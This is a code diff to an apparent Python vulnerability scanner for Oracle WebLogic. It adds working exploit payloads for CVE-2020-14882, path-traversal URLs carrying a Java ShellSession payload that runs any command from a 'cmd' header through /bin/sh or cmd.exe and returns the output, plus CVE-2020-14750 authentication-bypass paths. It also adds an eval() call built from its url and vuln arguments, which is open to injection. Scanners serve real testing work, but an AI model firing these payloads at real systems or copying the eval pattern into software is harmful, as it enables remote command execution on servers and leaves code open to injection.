@@ -23,6 +23,7 @@ from lib.tool.thread import thread
 from lib.tool import check
 from thirdparty import requests
 from time import sleep
+import http.client
 
 class Weblogic():
     def __init__(self):
@@ -36,6 +37,14 @@ class Weblogic():
 
         self.cve_2020_14882_payloads = [
             {
+                'path': 'images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
+                'data': ''
+            },
+            {
+                'path': 'images/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
+                'data': ''
+            },
+            {
                 'path': 'console/images/%252E./consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(\'weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("cmd");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();\')',
                 'data': ''
             },
@@ -46,6 +55,22 @@ class Weblogic():
         ]
 
         self.cve_2020_14750_payloads = [
+            {
+                'path': 'images/%252E./console.portal',
+                'data': ''
+            },
+            {
+                'path': 'images/%252e%252e%252fconsole.portal',
+                'data': ''
+            },
+            {
+                'path': 'css/%252E./console.portal',
+                'data': ''
+            },
+            {
+                'path': 'css/%252e%252e%252fconsole.portal',
+                'data': ''
+            },
             {
                 'path': 'console/images/%252E./console.portal',
                 'data': ''
@@ -132,6 +157,7 @@ class Weblogic():
         headers.update(vul_info['headers'])
 
         for payload in self.cve_2020_14882_payloads:    # * Payload
+
             path = payload['path']                      # * Path
             data = payload['data']                      # * Data
             target = url + path                         # * Target
@@ -141,6 +167,10 @@ class Weblogic():
             vul_info['target'] = target
 
             try:
+                # * 有时候用HTTP1.1会报错, 使用HTTP1.0试试
+                http.client.HTTPConnection._http_vsn = 10
+                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'
+
                 res = requests.get(
                     target, 
                     timeout=self.timeout, 
@@ -149,14 +179,24 @@ class Weblogic():
                     proxies=self.proxies, 
                     verify=False
                 )
+                http.client.HTTPConnection._http_vsn = 11
+                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
+
                 logger.logging(vul_info, res.status_code, res)                        # * LOG
+
             except requests.ConnectTimeout:
+                http.client.HTTPConnection._http_vsn = 11
+                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                 logger.logging(vul_info, 'Timeout')
                 return None
             except requests.ConnectionError:
+                http.client.HTTPConnection._http_vsn = 11
+                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                 logger.logging(vul_info, 'Faild')
                 return None
             except:
+                http.client.HTTPConnection._http_vsn = 11
+                http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'
                 logger.logging(vul_info, 'Error')
                 return None
 
@@ -218,16 +258,16 @@ class Weblogic():
                         continue
 
                     res2 = requests.get(
-                    target, 
-                    timeout=self.timeout, 
-                    headers=headers, 
-                    data=data, 
-                    proxies=self.proxies, 
-                    verify=False
-                )
+                        target, 
+                        timeout=self.timeout, 
+                        headers=headers, 
+                        data=data, 
+                        proxies=self.proxies, 
+                        verify=False
+                    )
                     logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                 else:
-                    return None
+                    continue
             except requests.ConnectTimeout:
                 logger.logging(vul_info, 'Timeout')
                 return None
@@ -310,8 +350,7 @@ class Weblogic():
 
                 if ((verify_res.status_code == 200) and ('CVE/2019/2725' in verify_res.text)):
                     results = {
-                        'Target': target,
-                        'Verify': verify_url,
+                        'Target': verify_url,
                         'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                         'Method': vul_info['vul_method'],
                         'Payload': {
@@ -383,8 +422,7 @@ class Weblogic():
 
                 if ((verify_res.status_code == 200) and ('CVE/2017/10271' in verify_res.text)):
                     results = {
-                        'Target': target,
-                        'Verify': verify_url,
+                        'Target': verify_url,
                         'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                         'Method': vul_info['vul_method'],
                         'Payload': {
@@ -456,7 +494,10 @@ class Weblogic():
                 }
                 return results
 
-    def addscan(self, url):
+    def addscan(self, url, vuln=None):
+        if vuln:
+            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+
         return [
             thread(target=self.cve_2020_14882_scan, url=url),
             thread(target=self.cve_2020_14750_scan, url=url),
